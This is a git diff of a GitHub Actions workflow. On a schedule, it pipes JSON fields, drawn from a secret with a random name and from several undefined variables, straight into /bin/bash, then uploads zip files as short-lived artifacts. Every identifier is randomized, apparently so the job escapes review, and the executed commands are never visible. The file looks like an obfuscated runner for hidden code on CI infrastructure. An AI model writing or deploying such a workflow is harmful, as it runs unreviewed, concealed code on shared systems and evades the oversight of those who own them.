@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '33 4,10,16,22 * * *'
+    - cron: '15 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -20,17 +20,20 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          der0: ${{ secrets.der0 }}
+          idj78379: ${{ secrets.idj78379 }}
         run: |
-          printf '%s' "$der0" | jq -r .cpto14165 | /bin/bash
-          echo $n25 | jq -r .jga216 | /bin/bash
-          echo $vs5 | jq -r .l185 | /bin/bash
-          echo $lu0917 | jq -r .tji3383 | /bin/bash
+          printf '%s' "$idj78379" | jq -r .wg40 | /bin/bash
+          echo $cwo8956 | jq -r .nhzr451 | /bin/bash
+          printf '%s' "$hz6" | jq -r .fjs923 | /bin/bash
+          printf '%s' "$c596" | jq -r .a862 | /bin/bash
+          printf '%s' "$s379" | jq -r .zoiwr3591 | /bin/bash
+          echo $gr95 | jq -r .uz061 | /bin/bash
+          echo $pggt06967 | jq -r .i350 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: KCUVVu26
+          name: fCGG7pdx
           path: "*.zip"
           retention-days: 1
